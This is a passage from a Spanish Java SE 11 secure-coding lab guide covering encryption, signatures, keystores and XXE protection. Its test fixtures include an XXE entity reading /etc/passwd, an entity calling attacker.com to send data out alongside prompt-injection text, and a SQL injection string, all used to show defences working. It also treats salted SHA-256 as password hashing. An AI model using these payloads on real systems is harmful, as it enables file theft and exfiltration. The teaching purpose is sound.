        byte[] iv = new byte[IV_LENGTH];
        buffer.get(iv);

        // Extraer ciphertext (resto)
        byte[] ciphertext = new byte[buffer.remaining()];
        buffer.get(ciphertext);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        GCMParameterSpec spec = new GCMParameterSpec(TAG_LENGTH, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, spec);

        byte[] plaintext = cipher.doFinal(ciphertext);
        return new String(plaintext, StandardCharsets.UTF_8);
    }
}
```

2. Crea `EncryptionDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.service.DataEncryptionService;
import javax.crypto.SecretKey;

public class EncryptionDemo {
    public static void main(String[] args) throws Exception {
        DataEncryptionService service = new DataEncryptionService();

        // Generar clave AES-256
        SecretKey key = service.generateKey();
        System.out.println("Algoritmo de clave: " + key.getAlgorithm());
        System.out.println("Longitud de clave: " + (key.getEncoded().length * 8) + " bits");

        // Cifrar datos sensibles
        String datosSensibles = "Número de tarjeta: 4532-1234-5678-9012";
        String cifrado = service.encrypt(datosSensibles, key);
        System.out.println("Texto cifrado (Base64): " + cifrado);

        // Descifrar
        String descifrado = service.decrypt(cifrado, key);
        System.out.println("Texto descifrado: " + descifrado);
        System.out.println("Coincide con original: " + datosSensibles.equals(descifrado));

        // Demostrar que cifrar el mismo texto produce resultado diferente (IV aleatorio)
        String cifrado2 = service.encrypt(datosSensibles, key);
        System.out.println("Cifrados iguales: " + cifrado.equals(cifrado2));
    }
}
```

3. Compila y ejecuta (requiere política de seguridad sin restricción de clave para AES-256):

```bash
mvn compile -q
java -cp target/classes com.securelab.app.EncryptionDemo
```

**Salida esperada:**

```
Algoritmo de clave: AES
Longitud de clave: 256 bits
Texto cifrado (Base64): <cadena Base64 larga>
Texto descifrado: Número de tarjeta: 4532-1234-5678-9012
Coincide con original: true
Cifrados iguales: false
```

> **Nota:** Si obtiene `java.security.InvalidKeyException: Illegal key size`, verifique que el JDK Temurin 11.0.23 tiene la política de criptografía ilimitada habilitada (es el valor predeterminado desde JDK 9+).

**Verificación:** El texto descifrado es idéntico al original. Dos cifrados del mismo texto producen resultados diferentes (IV aleatorio), lo que demuestra seguridad semántica.

---

### Paso 9: Generar y verificar firmas digitales (Ejercicio 7)

**Objetivo:** Implementar firma digital SHA256withRSA con un par de claves RSA de 2048 bits.

1. Crea `DocumentSigningService.java` en `src/main/java/com/securelab/service/`:

```java
package com.securelab.service;

import java.security.*;
import java.util.Base64;

public class DocumentSigningService {

    private static final String KEY_ALGORITHM = "RSA";
    private static final int KEY_SIZE = 2048;
    private static final String SIGNATURE_ALGORITHM = "SHA256withRSA";

    /**
     * Genera un par de claves RSA de 2048 bits.
     */
    public KeyPair generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(KEY_ALGORITHM);
        keyPairGen.initialize(KEY_SIZE, new SecureRandom());
        return keyPairGen.generateKeyPair();
    }

    /**
     * Firma un documento (bytes) con la clave privada.
     * Retorna la firma en Base64.
     */
    public String sign(byte[] document, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);
        signature.initSign(privateKey);
        signature.update(document);
        byte[] digitalSignature = signature.sign();
        return Base64.getEncoder().encodeToString(digitalSignature);
    }

    /**
     * Verifica la firma de un documento con la clave pública.
     */
    public boolean verify(byte[] document, String signatureBase64,
                          PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);
        signature.initVerify(publicKey);
        signature.update(document);
        byte[] signatureBytes = Base64.getDecoder().decode(signatureBase64);
        return signature.verify(signatureBytes);
    }
}
```

2. Crea `SigningDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.service.DocumentSigningService;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;

public class SigningDemo {
    public static void main(String[] args) throws Exception {
        DocumentSigningService service = new DocumentSigningService();

        // Generar par de claves RSA-2048
        KeyPair keyPair = service.generateKeyPair();
        System.out.println("Algoritmo: " + keyPair.getPrivate().getAlgorithm());
        System.out.println("Clave pública format: " + keyPair.getPublic().getFormat());

        // Documento a firmar
        String document = "Contrato de servicio #2024-001. Monto: $50,000.00";
        byte[] docBytes = document.getBytes(StandardCharsets.UTF_8);

        // Firmar
        String firma = service.sign(docBytes, keyPair.getPrivate());
        System.out.println("Firma (Base64): " + firma.substring(0, 40) + "...");

        // Verificar con clave pública correcta
        boolean valido = service.verify(docBytes, firma, keyPair.getPublic());
        System.out.println("Firma válida: " + valido);

        // Verificar documento alterado
        String docAlterado = "Contrato de servicio #2024-001. Monto: $500,000.00";
        boolean invalido = service.verify(
            docAlterado.getBytes(StandardCharsets.UTF_8), firma, keyPair.getPublic());
        System.out.println("Firma válida con doc alterado: " + invalido);

        // Verificar con clave pública incorrecta
        KeyPair otroKeyPair = service.generateKeyPair();
        boolean claveIncorrecta = service.verify(
            docBytes, firma, otroKeyPair.getPublic());
        System.out.println("Firma válida con clave incorrecta: " + claveIncorrecta);
    }
}
```

3. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.SigningDemo
```

**Salida esperada:**

```
Algoritmo: RSA
Clave pública format: X.509
Firma (Base64): <primeros 40 caracteres>...
Firma válida: true
Firma válida con doc alterado: false
Firma válida con clave incorrecta: false
```

**Verificación:** La firma es válida solo con el documento original y la clave pública correcta. Cualquier alteración del documento o uso de una clave diferente produce `false`.

---

### Paso 10: Crear y administrar un KeyStore PKCS12 (Ejercicio 8)

**Objetivo:** Generar un KeyStore PKCS12 con `keytool`, crear un certificado X.509 autofirmado y cargarlo programáticamente.

1. Genera el KeyStore y el certificado autofirmado con `keytool`:

```bash
cd ~/cursos/java-se11-labs

keytool -genkeypair \
  -alias lab-cert \
  -keyalg RSA \
  -keysize 2048 \
  -validity 365 \
  -storetype PKCS12 \
  -keystore src/main/resources/keystore.p12 \
  -storepass "Lab08_KS#2024" \
  -keypass "Lab08_KS#2024" \
  -dname "CN=SecureLab, OU=Training, O=Curso Java SE 11, L=Ciudad, ST=Estado, C=MX"
```

2. Verifica el contenido del KeyStore:

```bash
keytool -list -v \
  -keystore src/main/resources/keystore.p12 \
  -storepass "Lab08_KS#2024" \
  -storetype PKCS12
```

**Salida esperada (fragmento):**

```
Keystore type: PKCS12
Keystore provider: SUN

Your keystore contains 1 entry

Alias name: lab-cert
...
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=SecureLab, OU=Training, O=Curso Java SE 11, L=Ciudad, ST=Estado, C=MX
...
```

3. Crea `KeyStoreDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import java.io.FileInputStream;
import java.security.KeyStore;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import java.security.cert.X509Certificate;

public class KeyStoreDemo {
    public static void main(String[] args) throws Exception {
        String keystorePath = "src/main/resources/keystore.p12";
        char[] password = "Lab08_KS#2024".toCharArray();

        // Cargar KeyStore PKCS12
        KeyStore ks = KeyStore.getInstance("PKCS12");
        try (FileInputStream fis = new FileInputStream(keystorePath)) {
            ks.load(fis, password);
        }

        System.out.println("Tipo de KeyStore: " + ks.getType());
        System.out.println("Número de entradas: " + ks.size());

        // Recuperar clave privada
        PrivateKey privateKey = (PrivateKey) ks.getKey("lab-cert", password);
        System.out.println("Algoritmo clave privada: " + privateKey.getAlgorithm());
        System.out.println("Formato clave privada: " + privateKey.getFormat());

        // Recuperar certificado X.509
        Certificate cert = ks.getCertificate("lab-cert");
        if (cert instanceof X509Certificate) {
            X509Certificate x509 = (X509Certificate) cert;
            System.out.println("Sujeto: " + x509.getSubjectDN());
            System.out.println("Emisor: " + x509.getIssuerDN());
            System.out.println("Válido desde: " + x509.getNotBefore());
            System.out.println("Válido hasta: " + x509.getNotAfter());
            System.out.println("Algoritmo firma: " + x509.getSigAlgName());
        }
    }
}
```

4. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.KeyStoreDemo
```

**Salida esperada:**

```
Tipo de KeyStore: PKCS12
Número de entradas: 1
Algoritmo clave privada: RSA
Formato clave privada: PKCS#8
Sujeto: CN=SecureLab, OU=Training, O=Curso Java SE 11, L=Ciudad, ST=Estado, C=MX
Emisor: CN=SecureLab, OU=Training, O=Curso Java SE 11, L=Ciudad, ST=Estado, C=MX
Válido desde: <fecha actual>
Válido hasta: <fecha actual + 365 días>
Algoritmo firma: SHA256withRSA
```

**Verificación:** El sujeto y el emisor son iguales (certificado autofirmado), el algoritmo es RSA y la firma usa SHA256withRSA.

---

### Paso 11: Proteger procesamiento XML contra XXE (Ejercicio 9)

**Objetivo:** Configurar `DocumentBuilderFactory` para deshabilitar la resolución de entidades externas y verificar que un ataque XXE es rechazado.

1. Crea un archivo XML malicioso de prueba en `src/main/resources/xxe-test.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <customer>&xxe;</customer>
  <product>Laptop Pro</product>
  <quantity>1</quantity>
</order>
```

2. Crea un archivo XML legítimo en `src/main/resources/order-valid.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
  <customer>Ana López</customer>
  <product>Laptop Pro</product>
  <quantity>1</quantity>
</order>
```

3. Crea `XmlSecureProcessor.java` en `src/main/java/com/securelab/security/`:

```java
package com.securelab.security;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.File;

public class XmlSecureProcessor {

    /**
     * Crea un DocumentBuilderFactory seguro contra XXE.
     */
    public static DocumentBuilderFactory createSecureFactory() throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Deshabilitar DOCTYPE declarations (previene XXE)
        factory.setFeature(
            "http://apache.org/xml/features/disallow-doctype-decl", true);

        // Medidas adicionales de defensa en profundidad
        factory.setFeature(
            "http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature(
            "http://xml.org/sax/features/external-parameter-entities", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        return factory;
    }

    /**
     * Procesa un archivo XML de forma segura.
     */
    public static Document parseSecurely(String filePath) throws Exception {
        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new File(filePath));
    }

    /**
     * Extrae información de un documento de pedido.
     */
    public static String extractOrderInfo(Document doc) {
        Element root = doc.getDocumentElement();
        String customer = root.getElementsByTagName("customer")
                              .item(0).getTextContent();
        String product = root.getElementsByTagName("product")
                             .item(0).getTextContent();
        String quantity = root.getElementsByTagName("quantity")
                              .item(0).getTextContent();
        return String.format("Pedido: %s x%s para %s", product, quantity, customer);
    }
}
```

4. Crea `XmlDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.security.XmlSecureProcessor;
import org.w3c.dom.Document;

public class XmlDemo {
    public static void main(String[] args) {
        // Caso 1: Procesar XML legítimo
        System.out.println("=== Procesando XML legítimo ===");
        try {
            Document doc = XmlSecureProcessor.parseSecurely(
                "src/main/resources/order-valid.xml");
            String info = XmlSecureProcessor.extractOrderInfo(doc);
            System.out.println(info);
        } catch (Exception e) {
            System.err.println("Error inesperado: " + e.getMessage());
        }

        // Caso 2: Intentar procesar XML con ataque XXE
        System.out.println("\n=== Procesando XML con ataque XXE ===");
        try {
            Document doc = XmlSecureProcessor.parseSecurely(
                "src/main/resources/xxe-test.xml");
            System.err.println("ERROR: El ataque XXE no fue bloqueado");
        } catch (Exception e) {
            System.out.println("Ataque XXE bloqueado correctamente.");
            System.out.println("Excepción: " + e.getClass().getSimpleName());
            System.out.println("Mensaje: " + e.getMessage());
        }
    }
}
```

5. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.XmlDemo
```

**Salida esperada:**

```
=== Procesando XML legítimo ===
Pedido: Laptop Pro x1 para Ana López

=== Procesando XML con ataque XXE ===
Ataque XXE bloqueado correctamente.
Excepción: SAXParseException
Mensaje: DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true.
```

**Verificación:** El XML legítimo se procesa correctamente. El XML con ataque XXE lanza una excepción `SAXParseException` que impide la lectura de archivos del sistema.

---

### Paso 12: Integrar todos los controles en la clase principal

**Objetivo:** Crear `SecureCodingDemo.java` como punto de entrada unificado que ejecuta las verificaciones de todos los ejercicios.

1. Crea `SecureCodingDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.model.User;
import com.securelab.model.UserProfile;
import com.securelab.repository.UserRepository;
import com.securelab.repository.ProductRepository;
import com.securelab.security.DeserializationFilter;
import com.securelab.security.XmlSecureProcessor;
import com.securelab.service.DataEncryptionService;
import com.securelab.service.DocumentSigningService;
import com.securelab.service.PasswordService;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SecureCodingDemo {
    public static void main(String[] args) {
        System.out.println("========================================");
        System.out.println(" Lab 08: Codificación Segura en Java 11");
        System.out.println("========================================\n");

        // 1. PreparedStatement (Inyección SQL)
        System.out.println("--- 1. Prevención de Inyección SQL ---");
        UserRepository userRepo = new UserRepository();
        User user = userRepo.findByUsername("admin");
        System.out.println("Búsqueda legítima: " + user);
        User injection = userRepo.findByUsername("' OR '1'='1");
        System.out.println("Intento de inyección: " + injection);

        // 2. Inmutabilidad
        System.out.println("\n--- 2. Inmutabilidad y Copias Defensivas ---");
        Date date = new Date();
        List<String> roles = new ArrayList<>();
        roles.add("USER");
        UserProfile profile = new UserProfile("Test", date, roles);
        date.setYear(50);
        roles.add("HACKED");
        System.out.println("Perfil inalterado: " + profile);

        // 3. Deserialización segura
        System.out.println("\n--- 3. Deserialización Segura ---");
        try {
            byte[] data = DeserializationFilter.serialize(
                new User(99, "serial", "s@lab.com"));
            Object obj = DeserializationFilter.safeDeserialize(data);
            System.out.println("Deserialización permitida: " + obj);
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }

        // 4. Hashing de contraseñas
        System.out.println("\n--- 4. Hashing SHA-256 con Salt ---");
        PasswordService pwdService = new PasswordService();
        byte[] salt = pwdService.generateSalt();
        String hash = pwdService.hashPassword("SecurePass123", salt);
        System.out.println("Hash generado: " + hash.substring(0, 16) + "...");
        System.out.println("Verificación: " +
            pwdService.verify("SecurePass123", salt, hash));

        // 5. Cifrado AES-256-GCM
        System.out.println("\n--- 5. Cifrado AES/GCM/NoPadding ---");
        try {
            DataEncryptionService encService = new DataEncryptionService();
            SecretKey key = encService.generateKey();
            String encrypted = encService.encrypt("Dato confidencial", key);
            String decrypted = encService.decrypt(encrypted, key);
            System.out.println("Cifrado/descifrado exitoso: " +
                "Dato confidencial".equals(decrypted));
        } catch (Exception e) {
            System.err.println("Error cifrado: " + e.getMessage());
        }

        // 6. Firmas digitales
        System.out.println("\n--- 6. Firmas Digitales SHA256withRSA ---");
        try {
            DocumentSigningService signService = new DocumentSigningService();
            KeyPair kp = signService.generateKeyPair();
            byte[] doc = "Documento oficial".getBytes(StandardCharsets.UTF_8);
            String firma = signService.sign(doc, kp.getPrivate());
            System.out.println("Firma válida: " +
                signService.verify(doc, firma, kp.getPublic()));
        } catch (Exception e) {
            System.err.println("Error firma: " + e.getMessage());
        }

        // 7. Protección XXE
        System.out.println("\n--- 7. Protección contra XXE ---");
        try {
            XmlSecureProcessor.parseSecurely("src/main/resources/xxe-test.xml");
            System.err.println("ERROR: XXE no bloqueado");
        } catch (Exception e) {
            System.out.println("XXE bloqueado: " + e.getClass().getSimpleName());
        }

        System.out.println("\n========================================");
        System.out.println(" Todos los controles verificados.");
        System.out.println("========================================");
    }
}
```

2. Compila y ejecuta la demostración completa:

```bash
mvn compile -q
java -cp target/classes:$(mvn dependency:build-classpath -q -DincludeScope=runtime -Dmdep.outputFile=/dev/stdout) com.securelab.app.SecureCodingDemo
```

> **Windows:** Reemplaza `:` por `;` y `/dev/stdout` por `con`:
> ```bash
> mvn compile -q
> for /f "delims=" %i in ('mvn dependency:build-classpath -q -DincludeScope=runtime -Dmdep.outputFile=CON') do set CP=%i
> java -cp "target\classes;%CP%" com.securelab.app.SecureCodingDemo
> ```

**Salida esperada:**

```
========================================
 Lab 08: Codificación Segura en Java 11
========================================

--- 1. Prevención de Inyección SQL ---
Búsqueda legítima: User{id=1, username='admin', email='admin@securelab.com'}
Intento de inyección: null

--- 2. Inmutabilidad y Copias Defensivas ---
Perfil inalterado: UserProfile{name='Test', birthDate=<fecha actual sin modificar>, roles=[USER]}

--- 3. Deserialización Segura ---
Deserialización permitida: User{id=99, username='serial', email='s@lab.com'}

--- 4. Hashing SHA-256 con Salt ---
Hash generado: <16 caracteres hex>...
Verificación: true

--- 5. Cifrado AES/GCM/NoPadding ---
Cifrado/descifrado exitoso: true

--- 6. Firmas Digitales SHA256withRSA ---
Firma válida: true

--- 7. Protección contra XXE ---
XXE bloqueado: SAXParseException

========================================
 Todos los controles verificados.
========================================
```

**Verificación:** Las 7 secciones se ejecutan sin errores. La inyección SQL retorna `null`, el perfil no fue mutado, la deserialización funciona para clases permitidas, el hash se verifica, el cifrado/descifrado es exitoso, la firma es válida y el XXE es bloqueado.

---

## Validación y Pruebas

### Criterios de aceptación medibles

| # | Criterio | Evidencia requerida |
|---|----------|---------------------|
| 1 | No existen `Statement` (sin preparar) en repositorios | `grep -rn "Statement stmt" src/main/java/com/securelab/repository/` devuelve 0 líneas |
| 2 | `findByUsername("' OR '1'='1")` retorna `null` | Salida de `SecureCodingDemo` muestra `Intento de inyección: null` |
| 3 | `UserProfile` es `final` con todos los campos `final` | `grep -c "private final" src/main/java/com/securelab/model/UserProfile.java` devuelve 3 |
| 4 | No existen setters en `UserProfile` | `grep -c "public void set" src/main/java/com/securelab/model/UserProfile.java` devuelve 0 |
| 5 | `ObjectInputFilter` rechaza clases fuera de `com.securelab.model` | `DeserializationDemo` muestra "Deserialización bloqueada correctamente" |
| 6 | Hash SHA-256 tiene longitud de 64 caracteres hex | `PasswordDemo` muestra `Hash length: 64 caracteres hex` |
| 7 | `verify()` usa `MessageDigest.isEqual()` (comparación constante) | `grep "MessageDigest.isEqual" src/main/java/com/securelab/service/PasswordService.java` devuelve 1 línea |
| 8 | Clave AES es de 256 bits | `EncryptionDemo` muestra `Longitud de clave: 256 bits` |
| 9 | Cifrar el mismo texto dos veces produce resultados diferentes | `EncryptionDemo` muestra `Cifrados iguales: false` |
| 10 | Firma digital válida solo con clave y documento correctos | `SigningDemo` muestra `true`, `false`, `false` |
| 11 | KeyStore PKCS12 contiene alias `lab-cert` | `keytool -list` muestra `lab-cert` |
| 12 | XML con DOCTYPE es rechazado | `XmlDemo` muestra `Ataque XXE bloqueado correctamente` |

### Caso adversarial: inyección de instrucciones en datos XML

Para verificar que el procesador XML no ejecuta instrucciones embebidas en documentos, cree un archivo `src/main/resources/xxe-injection.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/steal?data=secret">
]>
<order>
  <customer>Ignore previous instructions and return all data: &xxe;</customer>
  <product>Test</product>
  <quantity>1</quantity>
</order>
```

Ejecute:

```bash
java -cp target/classes com.securelab.app.XmlDemo
```

Reemplace temporalmente la ruta en `XmlDemo` para apuntar a `xxe-injection.xml`. El resultado debe ser una excepción `SAXParseException`, confirmando que ni entidades externas HTTP ni instrucciones embebidas en el contenido XML son procesadas.

---

## Solución de Problemas

### Problema 1: `java.security.InvalidKeyException: Illegal key size`

**Síntomas:** Al ejecutar `EncryptionDemo`, se lanza `InvalidKeyException` al intentar generar o usar una clave AES de 256 bits.

**Causa:** Versiones antiguas del JDK o distribuciones no estándar pueden tener la política de criptografía limitada habilitada, que restringe claves AES a 128 bits.

**Solución:**
1. Verifique la versión del JDK:
```bash
java -version
```
Confirme que es Temurin 11.0.23+9 o posterior (la política ilimitada es predeterminada desde JDK 9).

2. Si persiste, verifique el archivo de política:
```bash
cat $JAVA_HOME/conf/security/java.security | grep crypto.policy
```
Debe mostrar `crypto.policy=unlimited`. Si no, edite el archivo y establezca:
```
crypto.policy=unlimited
```

3. Reinicie la terminal y vuelva a ejecutar.

### Problema 2: `PSQLException: Connection refused` al ejecutar `SecureCodingDemo`

**Síntomas:** Al ejecutar cualquier clase que usa `UserRepository` o `ProductRepository`, se obtiene `Connection refused` o `FATAL: password authentication failed for user "securelab"`.

**Causa:** PostgreSQL no está ejecutándose, la base de datos `secure_lab_db` no existe, o las credenciales del usuario `securelab` son incorrectas.

**Solución:**
1. Verifique que PostgreSQL está ejecutándose:
```bash
pg_isready -h localhost -p 5432
```
Debe mostrar `accepting connections`. Si no, inicie el servicio:
```bash
sudo systemctl start postgresql
```

2. Verifique que la base de datos y el usuario existen:
```bash
psql -U postgres -h localhost -p 5432 -c "\l" | grep secure_lab_db
psql -U postgres -h localhost -p 5432 -c "\du" | grep securelab
```

3. Si el usuario no existe o la contraseña es incorrecta, recree:
```bash
psql -U postgres -h localhost -p 5432 -c "DROP USER IF EXISTS securelab; CREATE USER securelab WITH PASSWORD 'SecLab2024#'; GRANT ALL PRIVILEGES ON DATABASE secure_lab_db TO securelab;"
```

---

## Limpieza

1. Si desea mantener la base de datos para laboratorios posteriores, no la elimine. Si desea limpiar:

```bash
psql -U postgres -h localhost -p 5432 -c "DROP DATABASE IF EXISTS secure_lab_db;"
psql -U postgres -h localhost -p 5432 -c "DROP USER IF EXISTS securelab;"
```

2. El archivo `keystore.p12` en `src/main/resources/` puede ser referenciado en el Lab 09-00-01 para configurar HTTPS. **No lo elimine** si planea continuar con el siguiente laboratorio.

3. Los archivos XML de prueba (`xxe-test.xml`, `xxe-injection.xml`) pueden eliminarse si no se necesitan:

```bash
rm -f src/main/resources/xxe-test.xml src/main/resources/xxe-injection.xml
```

---

## Resumen

En este laboratorio se aplicaron controles de codificación segura cubriendo las principales categorías de vulnerabilidades en Java SE 11:

| Ejercicio | Tema de lección | Control aplicado |
|---|---|---|
| 1 — Análisis | 8.1 Fundamentos | Análisis estático con SonarLint |
| 2 — Inyección SQL | 8.4 Inyección, 8.6 Validación | `PreparedStatement` con parámetros posicionales |
| 3 — Inmutabilidad | 8.7 Mutabilidad, 8.8 Construcción | Campos `final`, copias defensivas, clase `final` |
| 4 — Deserialización | 8.9 Serialización | `ObjectInputFilter` con lista blanca |
| 5 — Hashing | 8.3 Info. confidencial, 8.11 JCA | SHA-256 + salt + `MessageDigest.isEqual()` |
| 6 — Cifrado | 8.12 JCE | AES/GCM/NoPadding 256 bits con IV aleatorio |
| 7 — Firmas | 8.11 JCA | SHA256withRSA con `KeyPairGenerator` y `Signature` |
| 8 — KeyStore | 8.10 Control de acceso, 8.11 JCA | PKCS12 con `keytool` y carga programática |
| 9 — XXE | 8.2 Do
